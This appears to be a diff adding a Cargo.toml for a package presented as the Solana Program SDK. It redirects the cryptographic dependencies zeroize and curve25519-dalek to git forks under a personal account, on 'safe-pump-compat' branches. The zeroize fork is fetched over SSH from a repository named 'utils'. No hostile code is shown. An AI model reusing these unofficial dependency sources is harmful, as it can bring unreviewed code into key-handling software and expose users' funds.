@@ -1,0 +1,40 @@
+[package]
+name = "solana-program"
+version = "1.25.0"
+edition = "2021"
+rust-version = "1.72.0"
+description = "Solana Program SDK"
+documentation = "https://docs.rs/solana-program"
+repository = "https://github.com/solana-labs/solana"
+homepage = "https://solana.com"
+license = "Apache-2.0"
+
+[dependencies]
+zeroize = { git = "ssh://git@github.com/hamkj7hpo/utils.git", branch = "safe-pump-compat", version = "1.9.0", features = ["alloc", "zeroize_derive"], optional = true }
+curve25519-dalek = { git = "https://github.com/hamkj7hpo/curve25519-dalek.git", branch = "safe-pump-compat-v2", features = ["std", "serde"] }
+bincode = "1.3.3"
+blake3 = "1.3.7"
+borsh = "0.10.3"
+bs58 = "0.4.0"
+bv = "0.11.1"
+bytemuck = { version = "1.18.0", features = ["derive"] }
+itertools = "0.10.5"
+lazy_static = "1.4.0"
+log = "0.4.20"
+memoffset = "0.6.6"
+num-derive = "0.3.3"
+num-traits = "0.2.19"
+rustversion = "1.0.10"
+serde = { version = "1.0.210", features = ["derive"] }
+serde_bytes = "0.11.11"
+serde_derive = "1.0.210"
+serde_json = "1.0.128"
+sha2 = "0.10.8"
+sha3 = "0.10.8"
+subtle = "2.4.1"
+thiserror = "1.0.63"
+rand = "0.8.5"
+
+[features]
+default = []
+solana_program_zeroize = ["zeroize"]
